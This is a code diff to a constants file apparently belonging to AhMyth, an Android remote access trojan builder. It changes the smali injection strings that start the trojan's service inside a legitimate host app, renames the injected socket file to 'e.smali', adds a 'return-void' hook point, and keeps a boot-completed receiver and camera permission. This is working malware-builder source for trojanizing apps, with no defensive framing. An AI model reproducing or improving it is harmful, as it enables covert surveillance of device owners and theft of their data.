@@ -17,22 +17,17 @@ exports.outputLogsPath = 'Logs';
 exports.logColors = { RED: "red",  GREEN: "lime", YELLOW: "yellow", DEFAULT: "#82eefd" };
 exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2 };
 exports.defaultPort = 42474;
-exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/IOSocket.smali';
+exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/e.smali';
 exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
 exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
     '<intent-filter>' +
     '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
     '</intent-filter>' +
     '</receiver>';
-exports.serviceSrc = '\n\n    new-instance v0, Landroid/content/Intent;' +
-    '\n\n' +
-    '    const-class v1, Lahmyth/mine/king/ahmyth/MainService;' +
-    '\n\n' +
-    '    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V' +
-    '\n\n' +
-    '    invoke-virtual {p0, v0}, L';
-exports.serviceStart = ';->startService(Landroid/content/Intent;)Landroid/content/ComponentName;';
-exports.orgAppKey = ';->onCreate(Landroid/os/Bundle;)V';
+exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
+exports.serviceStart = ';->start()V \n\n' +
+'    return-void';
+exports.hookPoint = 'return-void';
 exports.permissions = [
     '<uses-permission android:name="android.permission.WAKE_LOCK"/>',
     '<uses-permission android:name="android.permission.CAMERA"/>',
